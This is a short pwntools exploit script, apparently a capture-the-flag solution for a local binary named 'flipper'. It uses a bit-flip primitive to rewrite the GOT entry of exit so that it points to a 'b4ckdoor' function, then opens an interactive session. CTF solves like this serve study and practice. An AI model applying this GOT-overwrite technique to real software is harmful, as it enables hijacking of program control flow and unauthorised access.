from pwn import *

context.arch = "amd64"

io = process("./flipper")
elf = ELF("./flipper")


def flip(addr: int, bit: int):
    info(f"fliping {hex(addr)} {bit}")
    io.sendlineafter(b"flip?\n", f"{hex(addr)} {bit}".encode())


exit_addr_bytes = elf.read(elf.got["exit"], 4)
b4ckdoor_addr_bytes = p32(elf.sym["b4ckdoor"])
info(f"exit_addr_bytes => {exit_addr_bytes.hex()}")
info(f"b4ckdoor_addr_bytes => {b4ckdoor_addr_bytes.hex()}")

flip(0x004012D9, 7)

for i in range(4):
    for bit in range(8):
        if b4ckdoor_addr_bytes[i] & (1 << bit) != exit_addr_bytes[i] & (1 << bit):
            flip(elf.got["exit"] + i, bit)

flip(0x004012D9, 7)

io.interactive()
